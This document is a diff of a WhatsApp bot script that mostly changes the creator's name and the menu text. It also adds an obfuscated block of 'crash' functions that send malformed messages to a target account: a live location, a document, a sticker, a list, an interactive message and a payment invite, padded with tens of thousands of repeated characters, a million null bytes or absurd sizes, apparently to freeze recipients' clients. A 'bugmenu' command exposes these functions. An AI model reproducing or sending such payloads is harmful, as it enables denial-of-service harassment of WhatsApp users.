@@ -468,7 +468,7 @@ if (db.data.settings[botNumber].autobio) {
 let setting = db.data.settings[botNumber]
 if (new Date() * 1 - setting.status > 1000) {
 let uptime = await runtime(process.uptime())
-await qio.updateProfileStatus(`ঔৣ⃕᭝Alfin Faridh Taufiqiy || ✅ Runtime : ${uptime}`)
+await qio.updateProfileStatus(`APIN VIP V7 || ✅ Runtime : ${uptime}`)
 setting.status = new Date() * 1
 }
 }
@@ -550,7 +550,7 @@ remoteJid: ""
 'message': {
   "eventMessage": {
     "isCanceled": false,
-    "name": "🌠 ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄",
+    "name": "𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈",
     "description": "Pe",
     "location": {
       "degreesLatitude": 0,
@@ -616,7 +616,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 listResponseMessage: {
-title: `Alfin Faridh Taufiqiy`
+title: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈`
 }
 }
 }
@@ -630,7 +630,7 @@ remoteJid: "status@broadcast"
 },
 message: {
 buttonsResponseMessage: {
-selectedButtonId: 'Alfin Faridh Taufiqiy',
+selectedButtonId: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈',
 type: 1,
 response: {
 selectedDisplayText: 'ngaceng'
@@ -651,7 +651,7 @@ newsletterAdminInviteMessage: {
 newsletterJid: `120363224727390375@newsletter`,
 newsletterName: `🔥`,
 jpegThumbnail: gampalsu,
-caption: ` Alfin Faridh Taufiqiy ? \n ⿻ ${m.body || m.mtype} `,
+caption: ` 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 \n ⿻ ${m.body || m.mtype} `,
 inviteExpiration: Date.now() + 1814400000
 }
 }
@@ -725,7 +725,7 @@ remoteJid: "status@broadcast"
 message: {
 "extendedTextMessage": {
 "text": `🔏🪨Msg ${m.body || m.mtype}`,
-"title": `⟠ Alfin Faridh Taufiqiy 々`,
+"title": `⟠ 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 々`,
 'jpegThumbnail': gampalsu,
 }
 }
@@ -747,7 +747,7 @@ message: {
 "jpegThumbnail": gampalsu,
 },
 "title": `🔏🪨Msg ${m.body || m.mtype}`,
-"description": `⟠ ঔৣ⃕᭝Alfin Faridh Taufiqiy𝐳᭄ Tops 々`,
+"description": `⟠𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈 々`,
 "currencyCode": "IDR",
 "priceAmount1000": "1000000000000000000",
 "retailerId": `🔏🪨Msg ${m.body || m.mtype}`,
@@ -887,11 +887,12 @@ if (!m.key.fromMe) return
 
 async function loading () {
 var gen2 = [
-"APINSTORE.ID",
-"APIN VIP V7",
-"Alfin Faridh Taufiqiy"
+"ALFIN",
+"FARIDH",
+"TAUFIQIY",
+"ALFIN FARIDH TAUFIQIY"
 ]
-let { key } = await qio.sendMessage(m.chat, {text: 'Alfin Faridh Taufiqiy'})
+let { key } = await qio.sendMessage(m.chat, {text: '𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈'})
 
 const pickRandom = (arr) => {
 return arr[Math.floor(Math.random() * arr.length)]
@@ -915,7 +916,7 @@ mentionedJid: [m.sender],
 externalAdReply: {
 showAdAttribution: false,
 renderLargerThumbnail: false,
-title: `Alfin Faridh Taufiqiy`,
+title: `𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈`,
 body: `${ucapanWaktu} ${m.pushName} 👋`,
 previewType: "VIDEO",
 thumbnail: selectedThumbnail,
@@ -1649,7 +1650,8 @@ cookie: gT.headers["set-cookie"].join("; ")
 return build_server + data.image
 }
 //=================================================//
-var _0x1e2d5c=_0x11d6;(function(_0x3a36c4,_0x23845e){var _0x1340f2=_0x11d6,_0x423967=_0x3a36c4();while(!![]){try{var _0x58784a=parseInt(_0x1340f2(0xf4))/0x1+-parseInt(_0x1340f2(0xec))/0x2+parseInt(_0x1340f2(0xe9))/0x3*(parseInt(_0x1340f2(0xdc))/0x4)+parseInt(_0x1340f2(0xe2))/0x5*(parseInt(_0x1340f2(0xe0))/0x6)+-parseInt(_0x1340f2(0xe1))/0x7+-parseInt(_0x1340f2(0xf5))/0x8+parseInt(_0x1340f2(0xd0))/0x9;if(_0x58784a===_0x23845e)break;else _0x423967['push'](_0x423967['shift']());}catch(_0xd4c5ce){_0x423967['push'](_0x423967['shift']());}}}(_0x1a62,0x54f30));async function lokascrash(_0x4f6d21,_0xce0a0){var _0x21c83a=_0x11d6,_0x4418ba=generateWAMessageFromContent(_0x4f6d21,proto['Message'][_0x21c83a(0xef)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'Alfin Faridh Taufiqiy'+'ꦾ'[_0x21c83a(0xeb)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x4f6d21,'quoted':_0xce0a0});await qio[_0x21c83a(0xcf)](_0x4f6d21,_0x4418ba['message'],{'participant':{'jid':_0x4f6d21},'messageId':_0x4418ba[_0x21c83a(0xf1)]['id']});}function _0x1a62(){var _0x7e476b=['whatsapp','{\x22currency\x22:\x22USD\x22,\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22transaction_id\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:879912500,\x22offset\x22:100},\x22reference_id\x22:\x224N88TZPXWUM\x22,\x22type\x22:\x22physical-goods\x22,\x22payment_method\x22:\x22\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:990000000,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:8712000,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:118800000,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:500,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x22custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\x22,\x22name\x22:\x22JAMUR\x22,\x22amount\x22:{\x22value\x22:1000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\x22,\x22name\x22:\x22Wortel\x22,\x22amount\x22:{\x22value\x22:5000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\x22,\x22name\x22:\x22Alfin Faridh Taufiqiy\x22,\x22amount\x22:{\x22value\x22:4000000,\x22offset\x22:100},\x22quantity\x22:99}]},\x22additional_note\x22:\x22\x22}','1715880173','0@s.whatsapp.net','./lib/lowdb/adapters/image/virgam.png','1715881084144','INITIATED_BY_ME','29396JrOBrz','chat','waUploadToServer','FBPAY','1219146ePLNMy','3857903JGHTKQ','5lNzRPd','Message','1715876003','now','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20Alfin Faridh Taufiqiy','ngaceng','global_search_new_chat','192JYcATA','image/webp','repeat','612558dIEoDX','review_and_pay','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','fromObject','10116','key','1679959486','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','222955cMBOSf','3722872DuOUjg','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','message','relayMessage','6968133TKMbxU','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','Alfin Faridh Taufiqiy','Alfin Faridh Taufiqiy'];_0x1a62=function(){return _0x7e476b;};return _0x1a62();}function _0x11d6(_0x2d939e,_0x51e809){var _0x1a6244=_0x1a62();return _0x11d6=function(_0x11d62b,_0x53b752){_0x11d62b=_0x11d62b-0xcc;var _0x27cc03=_0x1a6244[_0x11d62b];return _0x27cc03;},_0x11d6(_0x2d939e,_0x51e809);}async function iponcrash(_0x1116b7){var _0x3eece9=_0x11d6;await qio['relayMessage'](_0x1116b7,{'paymentInviteMessage':{'serviceType':_0x3eece9(0xdf),'expiryTimestamp':Date[_0x3eece9(0xe5)]()+0x6c258c00}},{'participant':{'jid':_0x1116b7}});}async function dokucrash(_0x4d91b5,_0x50837c){var _0x904d86=_0x11d6,_0x10c1c8=generateWAMessageFromContent(_0x4d91b5,proto[_0x904d86(0xe3)][_0x904d86(0xef)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x904d86(0xe7),'fileSha256':_0x904d86(0xee),'fileLength':'999999999','pageCount':0x3b9ac9ff,'mediaKey':_0x904d86(0xcc),'fileName':_0x904d86(0xd4)+'ꦾ'[_0x904d86(0xeb)](0xea60),'fileEncSha256':_0x904d86(0xd1),'directPath':'/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','mediaKeyTimestamp':_0x904d86(0xd7)}}),{'userJid':_0x4d91b5,'quoted':_0x50837c});await qio[_0x904d86(0xcf)](_0x4d91b5,_0x10c1c8[_0x904d86(0xce)],{'participant':{'jid':_0x4d91b5},'messageId':_0x10c1c8[_0x904d86(0xf1)]['id']});}async function crashasu(_0x12b93a,_0x14311a){var _0x1c7728=_0x11d6,_0x580993=generateWAMessageFromContent(_0x12b93a,proto[_0x1c7728(0xe3)][_0x1c7728(0xef)]({'stickerMessage':{'url':_0x1c7728(0xcd),'fileSha256':'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x1c7728(0xf3),'mimetype':_0x1c7728(0xea),'directPath':_0x1c7728(0xd2),'fileLength':_0x1c7728(0xf0),'mediaKeyTimestamp':_0x1c7728(0xe4),'isAnimated':![],'stickerSentTs':_0x1c7728(0xda),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x12b93a,'quoted':_0x14311a});await qio[_0x1c7728(0xcf)](_0x12b93a,_0x580993[_0x1c7728(0xce)],{'participant':{'jid':_0x12b93a},'messageId':_0x580993[_0x1c7728(0xf1)]['id']});}async function virgamcrash(_0x106fce,_0x162f86){var _0x422f67=_0x11d6,_0xc9ace7=generateWAMessageFromContent(_0x106fce,proto[_0x422f67(0xe3)][_0x422f67(0xef)]({'interactiveMessage':{'header':{'title':'Alfin Faridh Taufiqiy','hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/f82677de30c85652f80a3.jpg'}},{'upload':qio[_0x422f67(0xde)]})},'body':{'text':''},'footer':{'text':_0x422f67(0xe6)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x422f67(0xeb)](0xf4240)}}}),{'userJid':_0x106fce,'quoted':_0x162f86});await qio[_0x422f67(0xcf)](_0x106fce,_0xc9ace7[_0x422f67(0xce)],{'participant':{'jid':_0x106fce},'messageId':_0xc9ace7[_0x422f67(0xf1)]['id']});}async function listcrash(_0x19d69b,_0x1896dd){var _0x327302=_0x11d6,_0x58f243=generateWAMessageFromContent(_0x19d69b,proto['Message'][_0x327302(0xef)]({'listMessage':{'title':_0x327302(0xd3)+'ꦾ'[_0x327302(0xeb)](0xe09c0),'footerText':_0x327302(0xd4),'description':_0x327302(0xd3),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x327302(0xd4),'products':[{'productId':'4392524570816732'}]}],'productListHeaderImage':{'productId':'4392524570816732','jpegThumbnail':null},'businessOwnerJid':_0x327302(0xd8)}},'footer':_0x327302(0xd3),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x327302(0xf2),'entryPointConversionSource':_0x327302(0xe8),'entryPointConversionApp':_0x327302(0xd5),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x327302(0xdb)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x19d69b,'quoted':qiobug});await qio[_0x327302(0xcf)](_0x19d69b,_0x58f243[_0x327302(0xce)],{'participant':{'jid':_0x19d69b},'messageId':_0x58f243[_0x327302(0xf1)]['id']});}const qiobatosai={'key':{'participant':'0@s.whatsapp.net',...m[_0x1e2d5c(0xdd)]?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x1e2d5c(0xd9))},'nativeFlowMessage':{'buttons':[{'name':_0x1e2d5c(0xed),'buttonParamsJson':_0x1e2d5c(0xd6)}]}}}};
+var _0x1e2d5c=_0x11d6;(function(_0x3a36c4,_0x23845e){var _0x1340f2=_0x11d6,_0x423967=_0x3a36c4();while(!![]){try{var _0x58784a=parseInt(_0x1340f2(0xf4))/0x1+-parseInt(_0x1340f2(0xec))/0x2+parseInt(_0x1340f2(0xe9))/0x3*(parseInt(_0x1340f2(0xdc))/0x4)+parseInt(_0x1340f2(0xe2))/0x5*(parseInt(_0x1340f2(0xe0))/0x6)+-parseInt(_0x1340f2(0xe1))/0x7+-parseInt(_0x1340f2(0xf5))/0x8+parseInt(_0x1340f2(0xd0))/0x9;if(_0x58784a===_0x23845e)break;else _0x423967['push'](_0x423967['shift']());}catch(_0xd4c5ce){_0x423967['push'](_0x423967['shift']());}}}(_0x1a62,0x54f30));async function lokascrash(_0x4f6d21,_0xce0a0){var _0x21c83a=_0x11d6,_0x4418ba=generateWAMessageFromContent(_0x4f6d21,proto['Message'][_0x21c83a(0xef)]({'viewOnceMessage':{'message':{'liveLocationMessage':{'degreesLatitude':'p','degreesLongitude':'p','caption':'ⓧ𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈༻'+'ꦾ'[_0x21c83a(0xeb)](0xc350),'sequenceNumber':'0','jpegThumbnail':''}}}}),{'userJid':_0x4f6d21,'quoted':_0xce0a0});await qio[_0x21c83a(0xcf)](_0x4f6d21,_0x4418ba['message'],{'participant':{'jid':_0x4f6d21},'messageId':_0x4418ba[_0x21c83a(0xf1)]['id']});}function _0x1a62(){var _0x7e476b=['whatsapp','{\x22currency\x22:\x22USD\x22,\x22payment_configuration\x22:\x22\x22,\x22payment_type\x22:\x22\x22,\x22transaction_id\x22:\x22\x22,\x22total_amount\x22:{\x22value\x22:879912500,\x22offset\x22:100},\x22reference_id\x22:\x224N88TZPXWUM\x22,\x22type\x22:\x22physical-goods\x22,\x22payment_method\x22:\x22\x22,\x22order\x22:{\x22status\x22:\x22pending\x22,\x22description\x22:\x22\x22,\x22subtotal\x22:{\x22value\x22:990000000,\x22offset\x22:100},\x22tax\x22:{\x22value\x22:8712000,\x22offset\x22:100},\x22discount\x22:{\x22value\x22:118800000,\x22offset\x22:100},\x22shipping\x22:{\x22value\x22:500,\x22offset\x22:100},\x22order_type\x22:\x22ORDER\x22,\x22items\x22:[{\x22retailer_id\x22:\x22custom-item-c580d7d5-6411-430c-b6d0-b84c242247e0\x22,\x22name\x22:\x22JAMUR\x22,\x22amount\x22:{\x22value\x22:1000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-e645d486-ecd7-4dcb-b69f-7f72c51043c4\x22,\x22name\x22:\x22Wortel\x22,\x22amount\x22:{\x22value\x22:5000000,\x22offset\x22:100},\x22quantity\x22:99},{\x22retailer_id\x22:\x22custom-item-ce8e054e-cdd4-4311-868a-163c1d2b1cc3\x22,\x22name\x22:\x22ↈ𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈ᬊᬁ\x22,\x22amount\x22:{\x22value\x22:4000000,\x22offset\x22:100},\x22quantity\x22:99}]},\x22additional_note\x22:\x22\x22}','1715880173','0@s.whatsapp.net','./lib/lowdb/adapters/image/virgam.png','1715881084144','INITIATED_BY_ME','29396JrOBrz','chat','waUploadToServer','FBPAY','1219146ePLNMy','3857903JGHTKQ','5lNzRPd','Message','1715876003','now','›\x20\x20\x20\x20\x20\x20\x20\x20\x20\x20ⓧ𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈༻','ngaceng','global_search_new_chat','192JYcATA','image/webp','repeat','612558dIEoDX','review_and_pay','ld5gnmaib+1mBCWrcNmekjB4fHhyjAPOHJ+UMD3uy4k=','fromObject','10116','key','1679959486','4l/QOq+9jLOYT2m4mQ5Smt652SXZ3ERnrTfIsOmHWlU=','222955cMBOSf','3722872DuOUjg','5c/W3BCWjPMFAUUxTSYtYPLWZGWuBV13mWOgQwNdFcg=','https://mmg.whatsapp.net/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000&mms3=true','message','relayMessage','6968133TKMbxU','pznYBS1N6gr9RZ66Fx7L3AyLIU2RY5LHCKhxXerJnwQ=','/o1/v/t62.7118-24/f1/m233/up-oil-image-8529758d-c4dd-4aa7-9c96-c6e2339c87e5?ccb=9-4&oh=01_Q5AaIM0S5OdSlOJSYYsXZtqnZ-ifJC0XbXv3AWEfPbcBBjRJ&oe=666DA5A2&_nc_sid=000000','ⓧ𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈༻','𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈'];_0x1a62=function(){return _0x7e476b;};return _0x1a62();}function _0x11d6(_0x2d939e,_0x51e809){var _0x1a6244=_0x1a62();return _0x11d6=function(_0x11d62b,_0x53b752){_0x11d62b=_0x11d62b-0xcc;var _0x27cc03=_0x1a6244[_0x11d62b];return _0x27cc03;},_0x11d6(_0x2d939e,_0x51e809);}async function iponcrash(_0x1116b7){var _0x3eece9=_0x11d6;await qio['relayMessage'](_0x1116b7,{'paymentInviteMessage':{'serviceType':_0x3eece9(0xdf),'expiryTimestamp':Date[_0x3eece9(0xe5)]()+0x6c258c00}},{'participant':{'jid':_0x1116b7}});}async function dokucrash(_0x4d91b5,_0x50837c){var _0x904d86=_0x11d6,_0x10c1c8=generateWAMessageFromContent(_0x4d91b5,proto[_0x904d86(0xe3)][_0x904d86(0xef)]({'documentMessage':{'url':'https://mmg.whatsapp.net/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0&mms3=true','mimetype':_0x904d86(0xe7),'fileSha256':_0x904d86(0xee),'fileLength':'999999999','pageCount':0x3b9ac9ff,'mediaKey':_0x904d86(0xcc),'fileName':_0x904d86(0xd4)+'ꦾ'[_0x904d86(0xeb)](0xea60),'fileEncSha256':_0x904d86(0xd1),'directPath':'/v/t62.7119-24/40377567_1587482692048785_2833698759492825282_n.enc?ccb=11-4&oh=01_Q5AaIEOZFiVRPJrllJNvRA-D4JtOaEYtXl0gmSTFWkGxASLZ&oe=666DBE7C&_nc_sid=5e03e0','mediaKeyTimestamp':_0x904d86(0xd7)}}),{'userJid':_0x4d91b5,'quoted':_0x50837c});await qio[_0x904d86(0xcf)](_0x4d91b5,_0x10c1c8[_0x904d86(0xce)],{'participant':{'jid':_0x4d91b5},'messageId':_0x10c1c8[_0x904d86(0xf1)]['id']});}async function crashasu(_0x12b93a,_0x14311a){var _0x1c7728=_0x11d6,_0x580993=generateWAMessageFromContent(_0x12b93a,proto[_0x1c7728(0xe3)][_0x1c7728(0xef)]({'stickerMessage':{'url':_0x1c7728(0xcd),'fileSha256':'CWJIxa1y5oks/xelBSo440YE3bib/c/I4viYkrCQCFE=','fileEncSha256':'r6UKMeCSz4laAAV7emLiGFu/Rup9KdbInS2GY5rZmA4=','mediaKey':_0x1c7728(0xf3),'mimetype':_0x1c7728(0xea),'directPath':_0x1c7728(0xd2),'fileLength':_0x1c7728(0xf0),'mediaKeyTimestamp':_0x1c7728(0xe4),'isAnimated':![],'stickerSentTs':_0x1c7728(0xda),'isAvatar':![],'isAiSticker':![],'isLottie':![]}}),{'userJid':_0x12b93a,'quoted':_0x14311a});await qio[_0x1c7728(0xcf)](_0x12b93a,_0x580993[_0x1c7728(0xce)],{'participant':{'jid':_0x12b93a},'messageId':_0x580993[_0x1c7728(0xf1)]['id']});}async function virgamcrash(_0x106fce,_0x162f86){var _0x422f67=_0x11d6,_0xc9ace7=generateWAMessageFromContent(_0x106fce,proto[_0x422f67(0xe3)][_0x422f67(0xef)]({'interactiveMessage':{'header':{'title':'𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈','hasMediaAttachment':!![],...await prepareWAMessageMedia({'image':{'url':'https://telegra.ph/file/e8c1aee03b13f008ff65d.jpg'}},{'upload':qio[_0x422f67(0xde)]})},'body':{'text':''},'footer':{'text':_0x422f67(0xe6)},'nativeFlowMessage':{'messageParamsJson':'\x00'[_0x422f67(0xeb)](0xf4240)}}}),{'userJid':_0x106fce,'quoted':_0x162f86});await qio[_0x422f67(0xcf)](_0x106fce,_0xc9ace7[_0x422f67(0xce)],{'participant':{'jid':_0x106fce},'messageId':_0xc9ace7[_0x422f67(0xf1)]['id']});}async function listcrash(_0x19d69b,_0x1896dd){var _0x327302=_0x11d6,_0x58f243=generateWAMessageFromContent(_0x19d69b,proto['Message'][_0x327302(0xef)]({'listMessage':{'title':_0x327302(0xd3)+'ꦾ'[_0x327302(0xeb)](0xe09c0),'footerText':_0x327302(0xd4),'description':_0x327302(0xd3),'buttonText':null,'listType':0x2,'productListInfo':{'productSections':[{'title':_0x327302(0xd4),'products':[{'productId':'4392524570816732'}]}],'productListHeaderImage':{'productId':'4392524570816732','jpegThumbnail':null},'businessOwnerJid':_0x327302(0xd8)}},'footer':_0x327302(0xd3),'contextInfo':{'expiration':0x93a80,'ephemeralSettingTimestamp':_0x327302(0xf2),'entryPointConversionSource':_0x327302(0xe8),'entryPointConversionApp':_0x327302(0xd5),'entryPointConversionDelaySeconds':0x9,'disappearingMode':{'initiator':_0x327302(0xdb)}},'selectListType':0x2,'product_header_info':{'product_header_info_id':0x4433e2e130,'product_header_is_rejected':![]}}),{'userJid':_0x19d69b,'quoted':qiobug});await qio[_0x327302(0xcf)](_0x19d69b,_0x58f243[_0x327302(0xce)],{'participant':{'jid':_0x19d69b},'messageId':_0x58f243[_0x327302(0xf1)]['id']});}const qiobatosai={'key':{'participant':'0@s.whatsapp.net',...m[_0x1e2d5c(0xdd)]?{'remoteJid':'status@broadcast'}:{}},'message':{'interactiveMessage':{'header':{'hasMediaAttachment':!![],'jpegThumbnail':fs['readFileSync'](_0x1e2d5c(0xd9))},'nativeFlowMessage':{'buttons':[{'name':_0x1e2d5c(0xed),'buttonParamsJson':_0x1e2d5c(0xd6)}]}}}};
+
 //=================================================//
 /*if (m.message) {
 console.log(chalk.black(chalk.bgWhite('[ PESAN ]')), chalk.black(chalk.bgGreen(new Date)), chalk.black(chalk.bgBlue(budy || m.mtype)) + '\n' + chalk.magenta('=> Dari'), chalk.green(pushname), chalk.yellow(m.sender) + '\n' + chalk.blueBright('=> Di'), chalk.green(m.isGroup ? pushname : 'Private Chat', m.chat))
@@ -1712,16 +1714,11 @@ let tholol = `
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -1744,16 +1741,11 @@ let njing = `
 │ _Hi_ 👋 
 └┬☄  *${m.pushName}* 
 ││✈  *${ucapanWaktu} @${m.sender.split("@")[0]}*☠️
-│└────────────┈ ✈
-└┬────────────┈ ✈
-    𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 
-    𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
-┌└─────────────┈ ✈
 └─ 𝘽𝙊𝙏 𝙄𝙉𝙁𝙊   
 │𝐁𝐨𝐭 𝐍𝐚𝐦𝐞 : *${global.botname}*
 │𝐎𝐰𝐧𝐞𝐫 𝐍𝐚𝐦𝐞 : *${global.NamaOwner}* 
 │𝐕𝐞𝐫𝐬𝐢𝐨𝐧 𝐁𝐨𝐭 : *APIN VIP V7*
-│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *Alfin Faridh Taufiqiy*
+│𝐂𝐫𝐞𝐚𝐭𝐨𝐫 : *𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈*
 │𝐒𝐩𝐞𝐞𝐝 : *${speed()} miliseconds*
 │𝐑𝐮𝐧𝐭𝐢𝐦𝐞 : *${runtime(process.uptime())}*
 │𝐏𝐫𝐞𝐟𝐢𝐱 :  *No-Prefix*
@@ -1769,10 +1761,12 @@ let njing = `
 │𝐓𝐢𝐦𝐞 : *${time}*
 │𝐖𝐞𝐞𝐤 : *${week}*
 └─────────────┈ ✈
-┌└─────────────┈ ✈
 ││✑${prefix}bugmenu
+││✑${prefix}ownermenu
+││✑${prefix}grupmenu
 └─────────────────┈ ✈
- │𝙲𝚁𝙴𝙰𝚃𝙴𝙳 𝙱𝚈 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝙋𝙤𝙬𝙚𝙧𝙚𝙙 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
+ │𝘼𝙥𝙥𝙡𝙞𝙘𝙖𝙩𝙞𝙤𝙣 𝘽𝙮 : 𝙰𝙻𝙵𝙸𝙽 𝙵𝙰𝚁𝙸𝙳𝙷 𝚃𝙰𝚄𝙵𝙸𝚀𝙸𝚈
  └─────────────────┈ ✈`
 //Button Menu
 let freesex = {
@@ -1784,7 +1778,7 @@ interactiveMessage: {
 "isForwarded": true,
 "forwardedNewsletterMessageInfo": {
 "newsletterJid": '0@newsletter',
-"newsletterName": 'By Alfin Faridh Taufiqiy',
